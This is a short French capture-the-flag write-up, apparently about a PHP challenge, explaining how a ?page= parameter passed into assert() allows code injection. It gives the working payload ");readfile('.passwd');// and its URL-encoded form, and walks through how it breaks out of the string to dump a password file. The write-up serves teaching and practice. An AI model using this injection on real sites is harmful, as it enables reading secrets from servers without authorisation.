
## EN RAPIDE

URL du style : `...?page=home`

et dans le HTML il y a des liens :

?page=home

?page=about

?page=contact


Donc page contrôle quel contenu est affiché.

### A savoir

En PHP, assert() a une particularité dangereuse :

si on lui passe une chaîne, elle peut être évaluée comme du code PHP
Donc si le dev fait un truc comme :
`assert("... du code PHP construit avec ton input ...");` et que ton input se retrouve dans cette string, tu peux parfois injecter du PHP.

J'ai fait ca:

<img width="558" height="29" alt="image" src="https://github.com/user-attachments/assets/2346bb1f-691e-420c-b487-2b3f77e74740" />

J'ai eu 

<img width="944" height="43" alt="image" src="https://github.com/user-attachments/assets/544d07f8-1f4a-4d87-8667-1da0dc3f5ac4" />

Ce qu'on comprend c est que:

Puisque mon input est injecté au milieu de :

'includes/<TON_INPUT>.php'

On peut essayer un schéma classique d’injection : fermer la string courante ==> injecter du code ==> neutraliser ce qui reste (le .php' etc.)

J'ai donc fait ce payload: `");readfile('.passwd');//`

En URL ENCODING ca donne : `?page=%22);readfile(%27.passwd%27);// `

### Explication rapide

À cause de ce qu’on a vu dans l’erreur, le serveur fabrique une assertion du genre :

`assert("strpos('includes/" . $page . ".php', '..') === false"); `

Si on remplace $page par ton payload ");readfile('.passwd');//, l’expression devient conceptuellement :

`strpos('includes/");readfile('.passwd');//.php', '..') === false `

Et là, PHP “lit” ça comme :

 strpos('includes/') … puis tu fermes la string
 ); tu fermes l’appel à strpos(...) (ou tu fermes une partie de l’expression)
 readfile('.passwd'); s’exécute et affiche le fichier
 // commente tout le reste, notamment le .php', '..') === false

 <img width="941" height="74" alt="image" src="https://github.com/user-attachments/assets/66f9ead7-5738-4c73-8323-761dd692afbb" />

 

